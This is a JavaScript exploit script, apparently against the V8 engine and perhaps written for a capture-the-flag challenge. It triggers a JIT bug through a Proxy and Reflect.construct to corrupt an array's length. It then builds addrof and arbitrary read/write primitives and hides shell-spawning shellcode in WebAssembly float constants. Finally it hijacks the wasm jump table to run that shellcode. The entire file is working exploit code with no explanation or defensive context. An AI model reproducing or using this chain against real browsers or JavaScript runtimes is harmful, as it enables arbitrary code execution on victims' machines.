let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);

function itof(i) {
    int_view[0] = i
    return float_view[0]
}

function ftoi(f) {
    float_view[0] = f
    return int_view[0]
}

function lo(x) {
    return x & BigInt(0xffffffff)
}

function hi(x) {
    return (x >> 32n) & BigInt(0xffffffff)
}

function hex(i) {
    return "0x" + i.toString(16)
}

THRESHOLD = 0x2000

function f(p) {
    a.push(Reflect.construct(function(){}, arguments, p)?4.1835592388585281e-216:0); // itof(0x1337133700010000)
}

let a;
let oob_arr;
let obj_leaker;
let c_aar_arr;
let c_aaw_arr;

let jitted = false

let p = new Proxy(Object, {
    get: function() {
        if (jitted) {
            a[0] = {};
            oob_arr = Array(1);
            oob_arr[0] = 1.1;
            obj_leaker = [a];
            c_aar_arr = [2.2];
            c_aaw_arr = [3.3];
        }
        return Object.prototype;
    }
})

for (let i = 0; i <= THRESHOLD; i++) {
    a = Array(8)
    a[1] = 0.1
    a.pop()  // make a room such that push() does not reallocate elements
    if (i == THRESHOLD) {
        jitted = true;
    }
    f(p)
}
console.assert(oob_arr.length == 0x8000)
print("[+] Corrupted oob_arr.length with", oob_arr.length)

function oob_read32(offset) {
    // convert from uint32 indexing to uin64 indexing
    let val = ftoi(oob_arr[offset >> 1])
    if (offset % 2 == 0) {
        return lo(val)
    }
    return hi(val)
}

function oob_write32(offset, val) {
    // convert from uint32 indexing to uin64 indexing
    let temp = ftoi(oob_arr[offset >> 1])
    let new_val;
    if (offset % 2 == 0) {
        new_val = itof((hi(temp) << 32n) | val)
    } else {
        new_val = itof(val << 32n | lo(temp))
    }
    oob_arr[offset >> 1] = new_val
}

const OBJ_LEAKER_OFFSET = 0xd
function addrof(o) {
    obj_leaker[0] = o  // assign our target object to `obj_leaker`
    let addr = oob_read32(OBJ_LEAKER_OFFSET)  // read it using `oob_arr`
    return addr
}

const c_aar_arr_elements_offset = 0x14
const c_aaw_arr_elements_offset = 0x22

function caged_arb_read32(addr) {
    let elements = addr - 8n | 1n;
    oob_write32(c_aar_arr_elements_offset, elements)
    let leak = lo(ftoi(c_aar_arr[0]))
    return leak
}

function caged_arb_read64(addr) {
    let elements = addr - 8n | 1n;
    oob_write32(c_aar_arr_elements_offset, elements)
    let leak = ftoi(c_aar_arr[0])
    return leak
}

function caged_arb_write32(addr, val) {
    let elements = addr - 8n | 1n;
    let temp = caged_arb_read32(addr+4n)
    oob_write32(c_aaw_arr_elements_offset, elements)
    c_aaw_arr[0] = itof((temp << 32n) | val)
}

function caged_arb_write64(addr, val) {
    let elements = addr - 8n | 1n;
    oob_write32(c_aaw_arr_elements_offset, elements)
    c_aaw_arr[0] = itof(val)
}

/*
(module
  (func (export "main") (result f64)
    f64.const 1.617548436999262e-270
    f64.const 1.6181477269733566e-270
    f64.const 1.6305238557700824e-270
    f64.const 1.6477681441619941e-270
    f64.const 1.6456891197542608e-270
    f64.const 1.6304734321072042e-270
    f64.const 1.6305242777505848e-270
    drop
    drop
    drop
    drop
    drop
    drop
  )
  (func (export "pwn"))
)
*/

var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 0, 1, 124, 96, 0, 0, 3, 3, 2, 0, 1, 7, 14, 2, 4, 109, 97, 105, 110, 0, 0, 3, 112, 119, 110, 0, 1, 10, 76, 2, 71, 0, 68, 104, 110, 47, 115, 104, 88, 235, 7, 68, 104, 47, 98, 105, 0, 91, 235, 7, 68, 72, 193, 224, 24, 144, 144, 235, 7, 68, 72, 1, 216, 72, 49, 219, 235, 7, 68, 80, 72, 137, 231, 49, 210, 235, 7, 68, 49, 246, 106, 59, 88, 144, 235, 7, 68, 15, 5, 144, 144, 144, 144, 235, 7, 26, 26, 26, 26, 26, 26, 11, 2, 0, 11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module, {});
var wmain = instance.exports.main;
for (let j = 0x0; j < 10000; j++) {
    wmain()
}

instance_addr = addrof(instance)
jump_table_start = instance_addr + 0x48n
rwx_addr = caged_arb_read64(jump_table_start)
sc_addr = rwx_addr + 0x81an - 0x5n
print("[+] Shellcode @", hex(sc_addr+0x5n))

print("[+] Overwriting WasmInstanceObject jump_table_start to point to our shellcode")
caged_arb_write32(jump_table_start, sc_addr & BigInt(2**32-1))

 // to trigger jmp to address pointed by jump_table_start, we need another new function
var pwn = instance.exports.pwn;
print("[+] Executing shellcode")
pwn();
